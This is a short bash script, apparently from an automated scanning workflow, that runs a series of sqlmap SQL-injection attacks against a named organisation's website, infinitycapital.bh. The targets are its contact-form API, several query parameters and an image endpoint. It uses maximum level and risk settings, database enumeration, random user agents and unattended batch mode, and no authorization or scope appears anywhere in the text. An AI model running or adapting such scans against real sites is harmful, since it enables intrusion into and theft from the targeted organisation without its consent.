#!/bin/bash
cd "$(dirname "$0")"
OUT=tool_outputs
H="Content-Type: application/x-www-form-urlencoded|User-Agent: Mozilla/5.0"
D="fname=aa&lname=bb&areacode=973&tel=1234&cname=sqlmap1@www.infinitycapital.bh&subject=hello&msg=markerZZ91&check=true&targets=info@www.infinitycapital.bh"

# 1) /api/send POST - all params, multipart like the real form
sqlmap -u "https://www.infinitycapital.bh/api/send" --data="$D" \
  -p "fname,lname,areacode,tel,cname,subject,msg,check,targets" \
  --headers="$H" --batch --level=5 --risk=3 --dbs --threads=4 --flush-session \
  --random-agent -o $OUT/sqlmap_api_send.log > $OUT/sqlmap_api_send.stdout 2>&1

# 2) /api/send via true multipart (same encoding the browser uses)
sqlmap -u "https://www.infinitycapital.bh/api/send" \
  --data="fname=aa&lname=bb&areacode=973&tel=1234&cname=sqlmap2@www.infinitycapital.bh&subject=hello&msg=markerZZ92&check=true&targets=info@www.infinitycapital.bh" \
  -p "fname,lname,areacode,tel,cname,subject,msg,check,targets" \
  --headers="User-Agent: Mozilla/5.0" --batch --level=5 --risk=3 --dbs --threads=4 \
  --flush-session --random-agent --forms -o $OUT/sqlmap_api_send_multipart.log > $OUT/sqlmap_api_send_multipart.stdout 2>&1

# 3) GET query surfaces
sqlmap -u "https://www.infinitycapital.bh/404?q=test" -p "q" --batch --level=5 --risk=3 --dbs --threads=4 --flush-session --random-agent -o $OUT/sqlmap_404_q.log > $OUT/sqlmap_404_q.stdout 2>&1

sqlmap -u "https://www.infinitycapital.bh/?id=1&search=test&page=2" -p "id,search,page" --batch --level=5 --risk=3 --dbs --threads=4 --flush-session --random-agent -o $OUT/sqlmap_root_params.log > $OUT/sqlmap_root_params.stdout 2>&1

sqlmap -u "https://www.infinitycapital.bh/contact?cb=1&q=test" -p "cb,q" --batch --level=5 --risk=3 --dbs --threads=4 --flush-session --random-agent -o $OUT/sqlmap_contact_params.log > $OUT/sqlmap_contact_params.stdout 2>&1

sqlmap -u "https://www.infinitycapital.bh/_next/image?url=&w=100&q=75" -p "url,w,q" --batch --level=5 --risk=3 --dbs --threads=4 --flush-session --random-agent -o $OUT/sqlmap_next_image.log > $OUT/sqlmap_next_image.stdout 2>&1

sqlmap -u "https://www.infinitycapital.bh/api/?id=1&page=2" -p "id,page" --batch --level=5 --risk=3 --dbs --threads=4 --flush-session --random-agent -o $OUT/sqlmap_api_index.log > $OUT/sqlmap_api_index.stdout 2>&1

echo "SQLMAP_ALL_DONE" > $OUT/sqlmap_done.flag
